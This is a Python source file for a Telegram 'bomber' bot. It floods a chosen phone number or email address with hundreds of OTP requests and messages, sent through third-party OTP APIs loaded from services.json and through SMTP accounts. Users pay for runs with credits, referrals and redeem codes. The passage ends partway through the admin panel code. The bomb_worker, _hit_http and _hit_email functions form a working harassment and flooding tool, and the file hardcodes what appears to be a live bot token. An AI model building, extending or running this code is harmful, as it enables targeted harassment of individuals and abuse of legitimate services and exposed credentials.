# bot.py
# Telegram bomber bot — full admin panel, credits, redeems, multi-channel delivery.
# Requires: pip install aiogram aiohttp aiosmtplib
# Run: BOT_TOKEN=... python bot.py   (or edit token below)
# Render: set BOT_TOKEN env var. Health server binds to PORT (default 10000).
# Services: place services.json next to this file to auto-seed ~180 OTP APIs.

import asyncio
import aiohttp
import aiohttp.web
import aiosmtplib
import sqlite3
import secrets
import string
import time
import logging
import os
import csv
import io
import json
import pathlib
from email.mime.text import MIMEText
from email.utils import formataddr
from aiogram import Bot, Dispatcher, F, types, BaseMiddleware
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (InlineKeyboardMarkup, InlineKeyboardButton,
                           BufferedInputFile)

# ─────────────────────────── CONFIG ───────────────────────────
BOT_TOKEN     = os.getenv("BOT_TOKEN", "8301089530:AAFNYRfY3vbB7IgPybATo14rsUD4Th-ZONI")
DB_PATH       = os.getenv("DB_PATH", "bot.db")
SERVICES_JSON = os.getenv("SERVICES_JSON", "services.json")
ADMIN_IDS     = {5851573541, 728373773}
PORT          = int(os.getenv("PORT", "10000"))

DEFAULT_BOMB_COST    = 1
DEFAULT_MAX_COUNT    = 500
DEFAULT_COOLDOWN     = 30
DEFAULT_CONCURRENCY  = 25
DEFAULT_DAILY_BONUS  = 5
REFERRAL_BONUS       = 3
API_FAIL_THRESHOLD   = 5
LOG_RETENTION_DAYS   = 30
START_TIME           = int(time.time())

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s | %(levelname)s | %(message)s")
log = logging.getLogger("bomber")

# ─────────────────────────── DATABASE ───────────────────────────
_conn = sqlite3.connect(DB_PATH, check_same_thread=False)
_conn.row_factory = sqlite3.Row


def _exec(sql, params=(), fetch=None):
    with _conn:
        cur = _conn.execute(sql, params)
        if fetch == "one":
            return cur.fetchone()
        if fetch == "all":
            return cur.fetchall()
        return cur.lastrowid


def init_db():
    _conn.executescript("""
    CREATE TABLE IF NOT EXISTS users (
        user_id       INTEGER PRIMARY KEY,
        username      TEXT,
        first_name    TEXT,
        credits       INTEGER DEFAULT 0,
        banned        INTEGER DEFAULT 0,
        last_bomb     INTEGER DEFAULT 0,
        total_bombs   INTEGER DEFAULT 0,
        last_daily    INTEGER DEFAULT 0,
        referred_by   INTEGER,
        ref_count     INTEGER DEFAULT 0,
        vip_cost      INTEGER DEFAULT 0,
        created_at    INTEGER
    );
    CREATE TABLE IF NOT EXISTS redeem_codes (
        code        TEXT PRIMARY KEY,
        amount      INTEGER NOT NULL,
        max_uses    INTEGER NOT NULL,
        used        INTEGER DEFAULT 0,
        created_by  INTEGER,
        created_at  INTEGER,
        active      INTEGER DEFAULT 1
    );
    CREATE TABLE IF NOT EXISTS redeem_uses (
        code     TEXT,
        user_id  INTEGER,
        used_at  INTEGER,
        PRIMARY KEY (code, user_id)
    );
    CREATE TABLE IF NOT EXISTS apis (
        id           INTEGER PRIMARY KEY AUTOINCREMENT,
        name         TEXT UNIQUE,
        channel      TEXT DEFAULT 'http',
        url          TEXT NOT NULL,
        method       TEXT DEFAULT 'GET',
        body         TEXT DEFAULT '',
        headers      TEXT DEFAULT '',
        active       INTEGER DEFAULT 1,
        fail_streak  INTEGER DEFAULT 0,
        ok_count     INTEGER DEFAULT 0,
        fail_count   INTEGER DEFAULT 0,
        created_at   INTEGER
    );
    CREATE TABLE IF NOT EXISTS smtp_accounts (
        id          INTEGER PRIMARY KEY AUTOINCREMENT,
        host        TEXT,
        port        INTEGER,
        username    TEXT,
        password    TEXT,
        from_name   TEXT DEFAULT '',
        use_tls     INTEGER DEFAULT 1,
        active      INTEGER DEFAULT 1,
        fail_streak INTEGER DEFAULT 0,
        ok_count    INTEGER DEFAULT 0,
        fail_count  INTEGER DEFAULT 0
    );
    CREATE TABLE IF NOT EXISTS bomb_history (
        id       INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id  INTEGER,
        target   TEXT,
        count    INTEGER,
        msg      TEXT,
        ok       INTEGER,
        fail     INTEGER,
        ts       INTEGER
    );
    CREATE TABLE IF NOT EXISTS presets (
        id       INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id  INTEGER,
        name     TEXT,
        target   TEXT,
        count    INTEGER,
        msg      TEXT,
        UNIQUE(user_id, name)
    );
    CREATE TABLE IF NOT EXISTS blacklist (
        target   TEXT PRIMARY KEY,
        added_by INTEGER,
        added_at INTEGER
    );
    CREATE TABLE IF NOT EXISTS settings (
        key   TEXT PRIMARY KEY,
        value TEXT
    );
    CREATE TABLE IF NOT EXISTS logs (
        id       INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id  INTEGER,
        action   TEXT,
        detail   TEXT,
        ts       INTEGER
    );
    """)

    for k, v in (("bomb_cost",    DEFAULT_BOMB_COST),
                 ("max_count",    DEFAULT_MAX_COUNT),
                 ("cooldown",     DEFAULT_COOLDOWN),
                 ("concurrency",  DEFAULT_CONCURRENCY),
                 ("daily_bonus",  DEFAULT_DAILY_BONUS),
                 ("referral_bonus", REFERRAL_BONUS),
                 ("maintenance",  0)):
        _conn.execute("INSERT OR IGNORE INTO settings(key,value) VALUES(?,?)",
                      (k, str(v)))


def setting(key, cast=str):
    row = _exec("SELECT value FROM settings WHERE key=?", (key,), fetch="one")
    return cast(row["value"]) if row else None


def set_setting(key, value):
    _exec("INSERT INTO settings(key,value) VALUES(?,?) "
          "ON CONFLICT(key) DO UPDATE SET value=excluded.value", (key, str(value)))


def get_user(uid):
    return _exec("SELECT * FROM users WHERE user_id=?", (uid,), fetch="one")


def ensure_user(u: types.User):
    row = get_user(u.id)
    if not row:
        _exec("INSERT INTO users(user_id,username,first_name,credits,created_at) "
              "VALUES(?,?,?,?,?)",
              (u.id, u.username or "", u.first_name or "", 0, int(time.time())))
        row = get_user(u.id)
    else:
        _exec("UPDATE users SET username=?, first_name=? WHERE user_id=?",
              (u.username or "", u.first_name or "", u.id))
    return row


def add_credits(uid, amount):
    _exec("UPDATE users SET credits = credits + ? WHERE user_id=?", (amount, uid))


def take_credits(uid, amount):
    """Atomic — prevents negative balances under concurrency."""
    with _conn:
        cur = _conn.execute(
            "UPDATE users SET credits = credits - ? "
            "WHERE user_id = ? AND credits >= ?",
            (amount, uid, amount))
        return cur.rowcount > 0


def log_action(uid, action, detail=""):
    _exec("INSERT INTO logs(user_id,action,detail,ts) VALUES(?,?,?,?)",
          (uid, action, detail, int(time.time())))


def prune_logs():
    cutoff = int(time.time()) - LOG_RETENTION_DAYS * 86400
    with _conn:
        _conn.execute("DELETE FROM logs WHERE ts < ?", (cutoff,))


def gen_code(n=10):
    alphabet = string.ascii_uppercase + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(n))


def is_admin(uid):
    return uid in ADMIN_IDS


def is_blacklisted(target):
    return _exec("SELECT 1 FROM blacklist WHERE target=?", (target,),
                 fetch="one") is not None


# ─────────────────────────── SERVICES.JSON LOADER ───────────────────────────
def _format_phone_prefix(phone_format):
    """Return prefix string used before {target} in templates."""
    if not phone_format:
        return ""
    fmt = phone_format.strip().lower()
    if fmt == "with_plus91":
        return "+91"
    if fmt == "91-":
        return "91-"
    return ""  # raw and anything else


def _body_to_string(body_data):
    """services.json body may be {'_raw': '...'} or a dict. Serialize accordingly."""
    if not body_data:
        return ""
    if isinstance(body_data, str):
        return body_data
    if isinstance(body_data, dict):
        if "_raw" in body_data:
            return str(body_data["_raw"])
        return json.dumps(body_data, separators=(",", ":"))
    return str(body_data)


def _headers_to_string(headers_dict):
    if not headers_dict:
        return ""
    if isinstance(headers_dict, str):
        return headers_dict
    return "\n".join(f"{k}: {v}" for k, v in headers_dict.items())


def load_services_json(path=SERVICES_JSON):
    """Seed the apis table from services.json. Safe to call multiple times."""
    p = pathlib.Path(path)
    if not p.exists():
        log.info("services.json not found at %s — skipping seed", path)
        return 0

    try:
        raw = p.read_text(encoding="utf-8")
    except Exception as e:
        log.error("failed to read %s: %s", path, e)
        return 0

    # Handle two shapes:
    # 1. valid JSON: {"services": [...]}
    # 2. quoted/escaped string wrapping JSON: "{...}"
    data = None
    for attempt in ("direct", "unwrap"):
        try:
            if attempt == "direct":
                data = json.loads(raw)
            else:
                stripped = raw.strip()
                if stripped.startswith('"') and stripped.endswith('"'):
                    stripped = stripped[1:-1]
                    stripped = stripped.replace('\\"', '"').replace("\\\\", "\\")
                    data = json.loads(stripped)
        except Exception:
            data = None
        if data is not None:
            break

    if data is None:
        log.error("services.json is malformed — could not parse")
        return 0

    # some wrappers put a string inside a string
    if isinstance(data, str):
        try:
            data = json.loads(data)
        except Exception:
            log.error("services.json inner parse failed")
            return 0

    services = data.get("services") if isinstance(data, dict) else None
    if not services:
        log.warning("services.json has no 'services' array")
        return 0

    inserted = 0
    for svc in services:
        try:
            name = f"svc:{svc.get('name', 'unnamed')}"
            method = (svc.get("method") or "POST").upper()
            url_tpl = svc.get("url", "")
            prefix = _format_phone_prefix(svc.get("phone_format"))
            url = url_tpl.replace("{phone}", f"{prefix}{{target}}")

            body = _body_to_string(svc.get("data", {})).replace(
                "{phone}", f"{prefix}{{target}}")
            headers = _headers_to_string(svc.get("headers", {}))

            # insert if name not yet present
            exists = _exec("SELECT 1 FROM apis WHERE name=?", (name,),
                           fetch="one")
            if exists:
                continue
            _exec("INSERT INTO apis(name,channel,url,method,body,headers,"
                  "active,created_at) VALUES(?,?,?,?,?,?,?,?)",
                  (name, "http", url, method, body, headers, 1,
                   int(time.time())))
            inserted += 1
        except Exception as e:
            log.warning("failed to seed service %s: %s",
                        svc.get("name"), e)

    log.info("services.json: inserted %d new API endpoints", inserted)
    return inserted


# ─────────────────────────── MIDDLEWARE ───────────────────────────
class AutoRegisterMiddleware(BaseMiddleware):
    async def __call__(self, handler, event, data):
        u = getattr(event, "from_user", None)
        if u and not u.is_bot:
            ensure_user(u)
        return await handler(event, data)


# ─────────────────────────── BOMBER CORE ───────────────────────────
def _render(template, target, msg):
    if not template:
        return ""
    return (template
            .replace("{target}", target)
            .replace("{phone}", target)   # defensive
            .replace("{msg}", msg))


def _parse_headers(raw):
    out = {}
    if not raw:
        return out
    for line in raw.splitlines():
        if ":" in line:
            k, v = line.split(":", 1)
            out[k.strip()] = v.strip()
    return out


async def _hit_http(session, api_row, target, msg):
    url    = _render(api_row["url"], target, msg)
    method = (api_row["method"] or "GET").upper()
    body   = _render(api_row["body"], target, msg)
    headers = _parse_headers(api_row["headers"])
    timeout = aiohttp.ClientTimeout(total=12)
    try:
        if method == "POST":
            async with session.post(url, data=body or None, headers=headers,
                                    timeout=timeout) as r:
                await r.read()
        elif method == "PUT":
            async with session.put(url, data=body or None, headers=headers,
                                   timeout=timeout) as r:
                await r.read()
        else:
            async with session.get(url, headers=headers,
                                   timeout=timeout) as r:
                await r.read()
        return True
    except Exception as e:
        log.debug("http fail %s: %s", api_row["name"], e)
        return False


async def _hit_email(smtp_row, target, msg):
    try:
        m = MIMEText(msg)
        m["Subject"] = "Notification"
        m["From"] = formataddr((smtp_row["from_name"] or smtp_row["username"],
                                smtp_row["username"]))
        m["To"] = target

        port = smtp_row["port"]
        if port == 465:
            client = aiosmtplib.SMTP(hostname=smtp_row["host"], port=port,
                                     timeout=15, use_tls=True)
            await client.connect()
        else:
            client = aiosmtplib.SMTP(hostname=smtp_row["host"], port=port,
                                     timeout=15, use_tls=False)
            await client.connect()
            if smtp_row["use_tls"]:
                await client.starttls()

        await client.login(smtp_row["username"], smtp_row["password"])
        await client.send_message(m)
        await client.quit()
        return True
    except Exception as e:
        log.debug("smtp fail %s: %s", smtp_row["username"], e)
        return False


def _update_api_health(api_id, ok):
    if ok:
        _exec("UPDATE apis SET ok_count = ok_count + 1, fail_streak = 0 WHERE id=?",
              (api_id,))
    else:
        _exec("UPDATE apis SET fail_count = fail_count + 1, "
              "fail_streak = fail_streak + 1 WHERE id=?", (api_id,))
        row = _exec("SELECT fail_streak FROM apis WHERE id=?", (api_id,), fetch="one")
        if row and row["fail_streak"] >= API_FAIL_THRESHOLD:
            _exec("UPDATE apis SET active = 0 WHERE id=?", (api_id,))
            log.warning("API %s auto-disabled after %d fails",
                        api_id, row["fail_streak"])


def _update_smtp_health(smtp_id, ok):
    if ok:
        _exec("UPDATE smtp_accounts SET ok_count = ok_count + 1, "
              "fail_streak = 0 WHERE id=?", (smtp_id,))
    else:
        _exec("UPDATE smtp_accounts SET fail_count = fail_count + 1, "
              "fail_streak = fail_streak + 1 WHERE id=?", (smtp_id,))
        row = _exec("SELECT fail_streak FROM smtp_accounts WHERE id=?",
                    (smtp_id,), fetch="one")
        if row and row["fail_streak"] >= API_FAIL_THRESHOLD:
            _exec("UPDATE smtp_accounts SET active = 0 WHERE id=?", (smtp_id,))


async def bomb_worker(target: str, count: int, msg: str = "OTP"):
    http_apis  = _exec("SELECT * FROM apis WHERE active=1 AND channel='http'",
                       fetch="all")
    email_apis = _exec("SELECT * FROM smtp_accounts WHERE active=1", fetch="all")

    if not http_apis and not email_apis:
        return 0, 0, "no active delivery channels"

    global_conc = setting("concurrency", int) or DEFAULT_CONCURRENCY
    global_sem  = asyncio.Semaphore(global_conc)

    api_sems  = {f"http:{a['id']}": asyncio.Semaphore(5) for a in http_apis}
    smtp_sems = {f"smtp:{s['id']}": asyncio.Semaphore(3) for s in email_apis}

    ok = fail = 0
    ok_lock = asyncio.Lock()

    async with aiohttp.ClientSession() as session:
        async def task(i):
            nonlocal ok, fail
            async with global_sem:
                if http_apis and (i % 2 == 0 or not email_apis):
                    api = http_apis[(i // 2) % len(http_apis)]
                    async with api_sems[f"http:{api['id']}"]:
                        r = await _hit_http(session, api, target, msg)
                    _update_api_health(api["id"], r)
                elif email_apis:
                    smtp = email_apis[(i // 2) % len(email_apis)]
                    async with smtp_sems[f"smtp:{smtp['id']}"]:
                        r = await _hit_email(smtp, target, msg)
                    _update_smtp_health(smtp["id"], r)
                else:
                    r = False
                async with ok_lock:
                    if r:
                        ok += 1
                    else:
                        fail += 1

        await asyncio.gather(*(task(i) for i in range(count)))
    return ok, fail, None


# ─────────────────────────── BOT / DISPATCHER ───────────────────────────
bot = Bot(token=BOT_TOKEN,
          default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp  = Dispatcher(storage=MemoryStorage())
dp.message.middleware(AutoRegisterMiddleware())
dp.callback_query.middleware(AutoRegisterMiddleware())


class AdminFSM(StatesGroup):
    add_credits_uid   = State()
    add_credits_amt   = State()
    ded_credits_uid   = State()
    ded_credits_amt   = State()
    redeem_amount     = State()
    redeem_uses       = State()
    api_name          = State()
    api_url           = State()
    api_method        = State()
    api_body          = State()
    api_headers       = State()
    smtp_host         = State()
    smtp_port         = State()
    smtp_user         = State()
    smtp_pass         = State()
    smtp_name         = State()
    broadcast         = State()
    find_user         = State()
    edit_setting      = State()
    blacklist_add     = State()
    vip_uid           = State()
    vip_cost          = State()


# ─────────────────────────── GLOBAL CANCEL ───────────────────────────
@dp.message(Command("cancel"))
async def cmd_cancel(m: types.Message, state: FSMContext):
    cur = await state.get_state()
    if cur:
        await state.clear()
        await m.answer("✅ cancelled")
    else:
        await m.answer("nothing to cancel")


# ─────────────────────────── USER MENU ───────────────────────────
def user_menu_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💰 Balance",  callback_data="u:bal"),
         InlineKeyboardButton(text="🎁 Redeem",   callback_data="u:redeem_info")],
        [InlineKeyboardButton(text="📜 History",  callback_data="u:hist"),
         InlineKeyboardButton(text="🏆 Top",      callback_data="u:top")],
        [InlineKeyboardButton(text="🔗 Referral", callback_data="u:ref"),
         InlineKeyboardButton(text="🎉 Daily",    callback_data="u:daily")],
        [InlineKeyboardButton(text="📖 Help",     callback_data="u:help")],
    ])


@dp.message(CommandStart())
async def cmd_start(m: types.Message, state: FSMContext):
    await state.clear()
    u = ensure_user(m.from_user)
    if u["banned"]:
        return await m.answer("🚫 You are banned.")

    args = m.text.split(maxsplit=1)
    if len(args) > 1 and args[1].startswith("ref_"):
        try:
            referrer = int(args[1][4:])
        except ValueError:
            referrer = 0
        if referrer and referrer != m.from_user.id and not u["referred_by"]:
            ref_row = get_user(referrer)
            if ref_row:
                bonus = setting("referral_bonus", int)
                _exec("UPDATE users SET referred_by=? WHERE user_id=?",
                      (referrer, m.from_user.id))
                add_credits(referrer, bonus)
                add_credits(m.from_user.id, bonus)
                _exec("UPDATE users SET ref_count = ref_count + 1 WHERE user_id=?",
                      (referrer,))
                try:
                    await bot.send_message(
                        referrer,
                        f"🔗 New referral joined! +{bonus} credits.")
                except Exception:
                    pass

    text = (
        f"👋 <b>Welcome {m.from_user.first_name}</b>\n\n"
        f"🆔 <code>{m.from_user.id}</code>\n"
        f"💳 Credits: <b>{u['credits']}</b>\n\n"
        f"Use /bomb &lt;target&gt; &lt;count&gt; [msg] to fire.\n"
        f"Use /redeem &lt;code&gt; to top up."
    )
    await m.answer(text, reply_markup=user_menu_kb())


@dp.message(Command("help"))
async def cmd_help(m: types.Message, state: FSMContext):
    await state.clear()
    await m.answer(
        "<b>Commands</b>\n"
        "/start — main menu\n"
        "/balance — credits\n"
        "/bomb &lt;target&gt; &lt;count&gt; [msg]\n"
        "/preset save|use|del|list\n"
        "/redeem &lt;code&gt;\n"
        "/refer — referral link\n"
        "/daily — daily bonus\n"
        "/transfer &lt;user_id&gt; &lt;amount&gt;\n"
        "/history — last bombs\n"
        "/top — leaderboard\n"
        "/status — bot status\n"
        "/cancel — break out of any prompt"
    )


@dp.message(Command("balance"))
async def cmd_balance(m: types.Message, state: FSMContext):
    await state.clear()
    u = ensure_user(m.from_user)
    await m.answer(f"💳 Credits: <b>{u['credits']}</b>\n"
                   f"📊 Total bombs: <b>{u['total_bombs']}</b>\n"
                   f"🔗 Referrals: <b>{u['ref_count']}</b>")


@dp.callback_query(F.data == "u:bal")
async def cb_bal(c: types.CallbackQuery):
    u = ensure_user(c.from_user)
    await c.message.edit_text(
        f"💳 Credits: <b>{u['credits']}</b>\n"
        f"📊 Total bombs: <b>{u['total_bombs']}</b>\n"
        f"🔗 Referrals: <b>{u['ref_count']}</b>",
        reply_markup=user_menu_kb())
    await c.answer()


@dp.callback_query(F.data == "u:help")
async def cb_help(c: types.CallbackQuery):
    await c.message.edit_text(
        "<b>Quick help</b>\n\n"
        "/bomb target count [msg]\n"
        "/preset save name target count msg\n"
        "/preset use name\n"
        "/redeem CODE\n"
        "/daily\n"
        "/transfer user_id amount\n"
        "/history\n"
        "/top",
        reply_markup=user_menu_kb())
    await c.answer()


@dp.callback_query(F.data == "u:redeem_info")
async def cb_redeem_info(c: types.CallbackQuery):
    await c.message.edit_text("🎁 Send <code>/redeem YOURCODE</code>",
                              reply_markup=user_menu_kb())
    await c.answer()


@dp.callback_query(F.data == "u:ref")
async def cb_ref(c: types.CallbackQuery):
    me = await bot.get_me()
    link = f"https://t.me/{me.username}?start=ref_{c.from_user.id}"
    u = get_user(c.from_user.id)
    await c.message.edit_text(
        f"🔗 <b>Your referral link</b>\n\n<code>{link}</code>\n\n"
        f"Invited: <b>{u['ref_count']}</b>\n"
        f"You earn <b>{setting('referral_bonus', int)}</b> credits per new user.",
        reply_markup=user_menu_kb())
    await c.answer()


@dp.callback_query(F.data == "u:daily")
async def cb_daily(c: types.CallbackQuery):
    u = get_user(c.from_user.id)
    now = int(time.time())
    if now - u["last_daily"] < 86400:
        wait = 86400 - (now - u["last_daily"])
        h, rem = divmod(wait, 3600)
        mm = rem // 60
        await c.answer(f"⏳ Next daily in {h}h {mm}m", show_alert=True)
        return
    bonus = setting("daily_bonus", int)
    add_credits(c.from_user.id, bonus)
    _exec("UPDATE users SET last_daily=? WHERE user_id=?",
          (now, c.from_user.id))
    log_action(c.from_user.id, "daily", f"+{bonus}")
    await c.answer(f"🎉 +{bonus} credits!", show_alert=True)
    u2 = get_user(c.from_user.id)
    await c.message.edit_text(
        f"🎉 Daily bonus claimed! +{bonus}\n💳 Balance: <b>{u2['credits']}</b>",
        reply_markup=user_menu_kb())


@dp.callback_query(F.data == "u:hist")
async def cb_hist(c: types.CallbackQuery):
    rows = _exec("SELECT * FROM bomb_history WHERE user_id=? "
                 "ORDER BY ts DESC LIMIT 10", (c.from_user.id,), fetch="all")
    if not rows:
        txt = "📜 No history yet."
    else:
        lines = []
        for r in rows:
            t = time.strftime("%m-%d %H:%M", time.localtime(r["ts"]))
            lines.append(f"• <code>{r['target']}</code> x{r['count']} → "
                         f"{r['ok']}✅ {r['fail']}❌ ({t})")
        txt = "📜 <b>Last 10 bombs</b>\n\n" + "\n".join(lines)
    await c.message.edit_text(txt, reply_markup=user_menu_kb())
    await c.answer()


@dp.callback_query(F.data == "u:top")
async def cb_top(c: types.CallbackQuery):
    rows = _exec("SELECT user_id, username, first_name, total_bombs "
                 "FROM users ORDER BY total_bombs DESC LIMIT 10", fetch="all")
    lines = []
    for i, r in enumerate(rows, 1):
        name = (f"@{r['username']}" if r["username"]
                else r["first_name"] or str(r["user_id"]))
        medal = ["🥇", "🥈", "🥉"][i-1] if i <= 3 else f"{i}."
        lines.append(f"{medal} {name} — {r['total_bombs']} bombs")
    await c.message.edit_text(
        "🏆 <b>Leaderboard</b>\n\n" + "\n".join(lines or ["empty"]),
        reply_markup=user_menu_kb())
    await c.answer()


# ─────────────────────────── REDEEM ───────────────────────────
@dp.message(Command("redeem"))
async def cmd_redeem(m: types.Message, state: FSMContext):
    await state.clear()
    u = ensure_user(m.from_user)
    if u["banned"]:
        return await m.answer("🚫 Banned.")
    parts = m.text.split(maxsplit=1)
    if len(parts) < 2:
        return await m.answer("Usage: <code>/redeem CODE</code>")
    code = parts[1].strip().upper()
    row = _exec("SELECT * FROM redeem_codes WHERE code=? AND active=1",
                (code,), fetch="one")
    if not row:
        return await m.answer("❌ Invalid code.")
    if row["used"] >= row["max_uses"]:
        return await m.answer("❌ Code exhausted.")
    if _exec("SELECT 1 FROM redeem_uses WHERE code=? AND user_id=?",
             (code, m.from_user.id), fetch="one"):
        return await m.answer("❌ You already used this code.")
    add_credits(m.from_user.id, row["amount"])
    _exec("UPDATE redeem_codes SET used = used + 1 WHERE code=?", (code,))
    _exec("INSERT INTO redeem_uses(code,user_id,used_at) VALUES(?,?,?)",
          (code, m.from_user.id, int(time.time())))
    log_action(m.from_user.id, "redeem", f"{code} +{row['amount']}")
    await m.answer(f"✅ +{row['amount']} credits.\n"
                   f"💳 Balance: <b>{get_user(m.from_user.id)['credits']}</b>")


# ─────────────────────────── TRANSFER ───────────────────────────
@dp.message(Command("transfer"))
async def cmd_transfer(m: types.Message, state: FSMContext):
    await state.clear()
    parts = m.text.split()
    if len(parts) != 3:
        return await m.answer("Usage: <code>/transfer user_id amount</code>")
    try:
        to_uid = int(parts[1]); amt = int(parts[2])
    except ValueError:
        return await m.answer("numeric values required")
    if amt <= 0:
        return await m.answer("amount must be > 0")
    if to_uid == m.from_user.id:
        return await m.answer("can't transfer to yourself")
    if not get_user(to_uid):
        return await m.answer("❌ recipient not found")
    if not take_credits(m.from_user.id, amt):
        return await m.answer("❌ not enough credits")
    add_credits(to_uid, amt)
    log_action(m.from_user.id, "transfer_out", f"to={to_uid} amt={amt}")
    log_action(to_uid, "transfer_in", f"from={m.from_user.id} amt={amt}")
    await m.answer(f"✅ Sent {amt} credits to <code>{to_uid}</code>.\n"
                   f"💳 Balance: <b>{get_user(m.from_user.id)['credits']}</b>")
    try:
        await bot.send_message(
            to_uid,
            f"💸 Received {amt} credits from <code>{m.from_user.id}</code>.")
    except Exception:
        pass


# ─────────────────────────── PRESETS ───────────────────────────
@dp.message(Command("preset"))
async def cmd_preset(m: types.Message, state: FSMContext):
    await state.clear()
    parts = m.text.split(maxsplit=5)
    if len(parts) < 2:
        return await m.answer(
            "Usage:\n"
            "/preset save name target count [msg]\n"
            "/preset use name\n"
            "/preset del name\n"
            "/preset list")
    sub = parts[1].lower()

    if sub == "list":
        rows = _exec("SELECT * FROM presets WHERE user_id=? ORDER BY name",
                     (m.from_user.id,), fetch="all")
        if not rows:
            return await m.answer("no presets")
        lines = [f"• <b>{r['name']}</b> — <code>{r['target']}</code> x{r['count']}"
                 for r in rows]
        return await m.answer("📋 <b>Presets</b>\n\n" + "\n".join(lines))

    if sub == "save":
        if len(parts) < 5:
            return await m.answer("Usage: /preset save name target count [msg]")
        name   = parts[2]
        target = parts[3]
        try:
            count = int(parts[4])
        except ValueError:
            return await m.answer("count numeric")
        msg = parts[5] if len(parts) > 5 else "OTP"
        _exec("INSERT INTO presets(user_id,name,target,count,msg) VALUES(?,?,?,?,?) "
              "ON CONFLICT(user_id,name) DO UPDATE SET "
              "target=excluded.target, count=excluded.count, msg=excluded.msg",
              (m.from_user.id, name, target, count, msg))
        return await m.answer(f"✅ preset <b>{name}</b> saved")

    if sub == "use":
        if len(parts) < 3:
            return await m.answer("Usage: /preset use name")
        r = _exec("SELECT * FROM presets WHERE user_id=? AND name=?",
                  (m.from_user.id, parts[2]), fetch="one")
        if not r:
            return await m.answer("preset not found")
        await m.answer(f"🚀 firing preset <b>{r['name']}</b>...")
        await _do_bomb(m, r["target"], r["count"], r["msg"])
        return

    if sub == "del":
        if len(parts) < 3:
            return await m.answer("Usage: /preset del name")
        _exec("DELETE FROM presets WHERE user_id=? AND name=?",
              (m.from_user.id, parts[2]))
        return await m.answer("🗑 deleted")

    return await m.answer("unknown subcommand")


# ─────────────────────────── BOMB ───────────────────────────
async def _do_bomb(m: types.Message, target: str, count: int, msg: str):
    u = get_user(m.from_user.id)
    if u["banned"]:
        return await m.answer("🚫 banned")
    if setting("maintenance", int):
        return await m.answer("🔧 maintenance mode")
    max_count = setting("max_count", int)
    if count < 1 or count > max_count:
        return await m.answer(f"❌ count must be 1..{max_count}")
    cooldown = setting("cooldown", int)
    now = int(time.time())
    if now - u["last_bomb"] < cooldown:
        return await m.answer(f"⏳ wait {cooldown - (now - u['last_bomb'])}s")
    if is_blacklisted(target):
        return await m.answer("🚫 target is blacklisted")
    cost = u["vip_cost"] if u["vip_cost"] > 0 else setting("bomb_cost", int)
    if not take_credits(m.from_user.id, cost):
        return await m.answer(f"❌ need {cost} credits")
    _exec("UPDATE users SET last_bomb=?, total_bombs=total_bombs+1 "
          "WHERE user_id=?", (now, m.from_user.id))
    log_action(m.from_user.id, "bomb", f"{target} x{count} msg={msg!r}")
    status = await m.answer(
        f"🚀 Launching on <code>{target}</code> — {count} msgs...")
    asyncio.create_task(_run_and_report(status, m.from_user.id,
                                        target, count, msg))


async def _run_and_report(status_msg, uid, target, count, msg):
    try:
        ok, fail, err = await bomb_worker(target, count, msg)
        if err:
            text = f"⚠️ Cannot fire: {err}"
        else:
            text = (f"✅ Done\n"
                    f"🎯 <code>{target}</code>\n"
                    f"📨 Sent: <b>{ok}</b>  ❌ Failed: <b>{fail}</b>\n"
                    f"💳 Balance: <b>{get_user(uid)['credits']}</b>")
        _exec("INSERT INTO bomb_history(user_id,target,count,msg,ok,fail,ts) "
              "VALUES(?,?,?,?,?,?,?)",
              (uid, target, count, msg, ok, fail, int(time.time())))
        try:
            await status_msg.edit_text(text)
        except Exception:
            pass
    except Exception as e:
        log.exception("bomb task crashed")
        try:
            await status_msg.edit_text(f"⚠️ bomb crashed: <code>{e}</code>")
        except Exception:
            pass


@dp.message(Command("bomb"))
async def cmd_bomb(m: types.Message, state: FSMContext):
    await state.clear()
    parts = m.text.split(maxsplit=3)
    if len(parts) < 3:
        return await m.answer(
            "Usage: <code>/bomb &lt;target&gt; &lt;count&gt; [msg]</code>")
    try:
        count = int(parts[2])
    except ValueError:
        return await m.answer("❌ count must be integer")
    msg = parts[3] if len(parts) > 3 else "OTP"
    await _do_bomb(m, parts[1].strip(), count, msg)


# ─────────────────────────── STATUS ───────────────────────────
@dp.message(Command("status"))
async def cmd_status(m: types.Message, state: FSMContext):
    await state.clear()
    uptime = int(time.time()) - START_TIME
    h, rem = divmod(uptime, 3600)
    mm = rem // 60
    users    = _exec("SELECT COUNT(*) c FROM users", fetch="one")["c"]
    apis     = _exec("SELECT COUNT(*) c FROM apis WHERE active=1", fetch="one")["c"]
    apis_all = _exec("SELECT COUNT(*) c FROM apis", fetch="one")["c"]
    smtps    = _exec("SELECT COUNT(*) c FROM smtp_accounts WHERE active=1",
                     fetch="one")["c"]
    bombs    = _exec("SELECT COALESCE(SUM(total_bombs),0) s FROM users",
                     fetch="one")["s"]
    await m.answer(
        f"⚙️ <b>Status</b>\n\n"
        f"⏱ Uptime: {h}h {mm}m\n"
        f"👥 Users: <b>{users}</b>\n"
        f"🔌 HTTP APIs: <b>{apis}/{apis_all}</b> active\n"
        f"📧 SMTP: <b>{smtps}</b> active\n"
        f"💥 Total bombs: <b>{bombs}</b>")


# ─────────────────────────── ADMIN ───────────────────────────
def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Stats",         callback_data="a:stats"),
         InlineKeyboardButton(text="👥 Users",         callback_data="a:users:0")],
        [InlineKeyboardButton(text="➕ Add Credits",   callback_data="a:add"),
         InlineKeyboardButton(text="➖ Deduct Credits", callback_data="a:ded")],
        [InlineKeyboardButton(text="🎁 Redeem",        callback_data="a:redeem"),
         InlineKeyboardButton(text="🔌 APIs",          callback_data="a:apis")],
        [InlineKeyboardButton(text="📧 SMTP",          callback_data="a:smtp"),
         InlineKeyboardButton(text="⚙️ Settings",      callback_data="a:settings")],
        [InlineKeyboardButton(text="📢 Broadcast",     callback_data="a:bcast"),
         InlineKeyboardButton(text="🔎 Find User",     callback_data="a:find")],
        [InlineKeyboardButton(text="🚫 Blacklist",     callback_data="a:black"),
